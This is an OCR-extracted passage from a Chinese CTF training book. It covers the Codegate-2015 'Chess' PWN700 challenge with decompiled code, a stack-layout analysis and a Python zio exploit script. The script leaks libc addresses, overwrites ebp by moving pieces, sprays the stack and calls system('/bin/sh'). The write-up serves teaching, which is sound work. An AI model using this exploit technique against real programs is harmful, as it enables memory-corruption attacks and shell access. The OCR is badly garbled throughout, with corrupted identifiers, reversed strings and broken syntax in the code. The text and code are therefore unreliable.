由图12-40可以看出，数字（行）部分几乎无法利用，列上面的
利用空间则比较大，只要是alpha就可以。
2）还有一个比较大的检测函数，下面简单说说其用处，如图
12-41所示。
该检测要求from_pos里的数据必须是大小写交叉的，同时
---
## Page 436
CTF特训营：技术详解、解题方法与
12.6.3 (Codegate-2015)Chess(PWN700)
436/1144
can_move_E3D函数会根据from_pos来检测移动是否符合规矩，比如
车走直线、马走日、象走田等。
signed int __cdecl check_position_124E(char buff, pos_struc *pos)
signed int result;// eax@3
if（u3E75（buff) &&（unsigned int)（buff[1]-θx3θ）row]+to_pos->col) =▪(&chess_nap[8 ▪fron_pos->row] +fron_pos->col);
result - &chess_nap[8 ▪ fron_pos=>rou] ▪ fron_pos=>cel;
result =
return result;
图12-42chess程序move函数的反编译代码
查看反编译的结果，可以得到栈的大小和相对位置信息。
main函数的反编译代码如图12-43所示
玩游戏的函数的反编译代码如图12-44所示。
可以发现，栈信息如下（chess_map中用于存放棋盘上的信息
大小为64字节）：
ebp
ret_addr
chess_map[0..64]
---
## Page 438
CTF特训营：技术详解、解题方法与
12.6.3 (Codegate-2015)Chess(PWN700)
438/1144
int
_cdecl main（int argc，const char ￥argu,const char *enup)
char chess_nap[64];// [sp+10h][bp40h]@1
setubuf（stdout，θ，2,0）;
puts("Shall we play a game?\n");
init_B50(chess_map);
play_game_J15BD(chess_map);
puts("Gane over");
return 0;
图12-43chess程序主函数的反编译代码
int
_cdecl play_game_15BD(char *chess_map)
?
int result;// eax@3
int i;//[sp+1ch] [bp-Ch]@1
for（i=0；；i=i==θ）
result =check_status_1505(chess_map);
if（result )
break;
show_map_c46(chess_map);
input_run_1379(chess_map,i);
return result;
图12-44chess程序主功能函数的反编译代码
所以，如果移动chess_map中的数据，往前可以覆盖到ebp（其
---
## Page 439
CTF特训营：技术详解、解题方法与
12.6.3 (Codegate-2015)Chess(PWN700)
439/1144
实并没有什么用）。
其实，应该查看进入inputrun或者show_map的栈信息，如下：
---input.run stac.-or.--showmap stack---)
---play_game stack.--
...main stack..
ebp
ret_addr
chess_map参数
chess_map[0..64]
进入show_map中，chess_map参数是根据play_game中的参数
得到的，所以可以修改进入play_game时压在栈顶的chess_map参数，
这个参数值离chess_map缓冲区的地址不远，相差0x10，因此修改这
个地址就可以泄露信息。
泄露信息后应该如何利用呢？由于每次只能覆盖一个学节，通过
修改ebp，利用leave_re指令，可以间接获取控制权。
泄露信息：因为r（车）的移动性比较好，所以一般选用该棋子
来进行利用，由于打印棋盘的参数中chess_map缓冲区的距离就是
---
## Page 440
CTF特训营：技术详解、解题方法与
12.6.3(Codegate-2015)Chess(PWN700)
440/1144
0x10，所以将r移动到左上角以后，再往前面移动16位就可以了
(From to:a8->Q8)。
覆盖ebp获取控制权：可以计算出main函数的ebp位置与
chess_map缓冲区的距离为0x18，再往前面移动24位就可以了
（Fromto:a8->J8)。
因为泄露后，棋盘布局比较混乱，不好移动，所以选择先覆盖
ebp，然后泄露信息。
利用流程具体如下
1）覆盖ebp，移动棋子用“R”覆盖ebp的第二个字节，变成
"0x****52**
2）移动K到棋盘底部，与小k相邻，这样可以方便最后成功泄露
信息，因为修改chess_map参数后，棋盘的打印信息会发生变化，一
旦检测到棋盘上面没有kK，就会判断游戏结束，所以将两者连在一
起往后放，以确保泄露信息的时候游戏依然正常。这样做也为最后结
束游戏做好了准备。
3）泄露信息，移动棋子用“r”覆盖chess_map在栈上作为传入
---
## Page 441
CTF特训营：技术详解、解题方法与
12.6.3 (Codegate-2015)Chess(PWN700)
441/1144
参数的最后一个字节，变成“0x*****72"（这个地方选择0x72而不是
0x52，就是为了尽量将输出地址往后挪，以便泄露更多的信息）。
4）Spray栈，根据泄露的信息获取system和/bin/sh的地址，构造
Payload，一直作为参数进行输入，一旦出现输入错误，由于获取参
数的函数是递归进行的，所以栈会不断地往前挪，导致“0x****52*
碰撞的机会比较大（0x52比0x72小是有好处的，防止ebp中该位置的
值原来就比0x72小，覆盖不到）。
由于被覆盖的地方必须与原来位置上的值的大小写不一样，所以
PIE反而提高了成功的概率。
利用成功的截图如图12-45所示
---
## Page 442
CTF特训营：技术详解、解题方法与
12.6.3(Codegate-2015)Chess(PWN700)
442/1144
t4
3|:W3
2
1060.So
1
abcdefgh
tBlacks move.
sd5
c5
Not a real position..
Invalid move,try again
Blacks move...
From>>d5
To>>C5
Black wins!
Game over
ls
change_random.sh
chess3.py
ld-2.19.so
test
chess
chess.py
libc-2.19.so
test.c
chess2.py
info.txt
peda-session-chess.txt
图12-45利用成功截图
代码如下：
from zio import *
target="./chess"#("localhost”",7575)
def get_io(target):
read_mode=COLORED（RAW，"green")
write_mode=COLORED(RAW,“blue”)
io=zio（target,timeout=9999,print read=readmode,print write=writemode）
return io
def from_to（io,from_buff,to_buff):
io.read_until("From>>")
io.write(from_buff+"n")
io.read_until("To>>")
---
## Page 443
CTF特训营：技术详解、解题方法与
12.6.3 (Codegate-2015)Chess(PWN700)
443/1144
io.write(to_buff +"n")
def run_seq(io, seq):
for item in seq：
from_to（io,item[0:2],item[2:4])
def trim_diff_buff（data):
buff =data
foriin range(1,9):
1%p%=oju！
buff =buff.replace(info,)
1%up%l = oju!
buff =buff.replace(info,)
return buff
def spray_buff(io, base_buff:
payload="a”*8
while len(payload)+len(base_buff)64-12:
return
stack_offset=64-pos b
print“stack_offset:，stack_offset
print[cfor cin chess_map]
pos_b = chess_map.find(kK ") +4
---
## Page 445
CTF特训营：技术详解、解题方法与
12.6.3 (Codegate-2015)Chess(PWN700)
445/1144
print[cforcinchess_map]
print hex(32(chess_map[pos_b:pos_b+4]))
print hex(32(chess_map[pos_b+4:pos_b+4+4]))
print hex(132(chess_map[pos_b+8:pos_b+8+ 4]))
print hex(l32(chess_map[pos_b+0xC:pos_b+0xC+4])
#io.gdb_hint()
text_addr=132(chess_map[pos_b:pos_b+4])
libc_addr=|32(chess_map[pos_b+12:pos_b+12+4])
text base=text addr-（0xf7747680-（0xf77473c8-0x13c8)
offset
libc_start_main_ret=0x19a83
offset_system=0x0003e800
offset_str _bin_sh=0x15f9e4
islocal=True
if is_local ==False:
offset
libc startmainret=0x19a63
offset_system=0x0003e360
offset_str_bin_sh=0x15d1a9
libcbase=libc addr-offset
libc_start_main_ret
system_addr= libc_base+offset_system
binsh_addr=libc_base+offset_str bin_sh
base_buff=132(system_addr)*2+132(binsh_addr)*2
spray_buff(io,base buff)
print “text base:",hex(text base)
print“break_pos:",hex(text_base+0x1605)
print “system_addr:",hex(system_addr)
print origin_data
kK_pos = pos_b = origin_data.find("kK")
pos_b= origin_data.find(T,pos_b +1)
while origin_data[pos_b+2]!=n:
pos_b=origin_data.find(T,pos_b+1)
line_pos=int（origin_data[pos_b+1])
K_pos=8-（pos_b-（kK_pos +1）)
k_pos=8-（pos_b-kK_pos)
from_buff =chr（ord(a）+K_pos)+“%d"%line_pos
to_buff += chr（ord(a）)+k_pos)+"%d"%line_pos
printfrom_buff
print to_buff
from_to(io,from_buff,to_buff）
io.interact()
while True:
:n
io=get_io（target)
pwn(io)
---
## Page 446
CTF特训营：技术详解、解题方法与
12.6.3 (Codegate-2015)Chess(PWN700)
446/1144
exceptException,e:
pass
else:
pass
finally:
io.close()
参考：
1)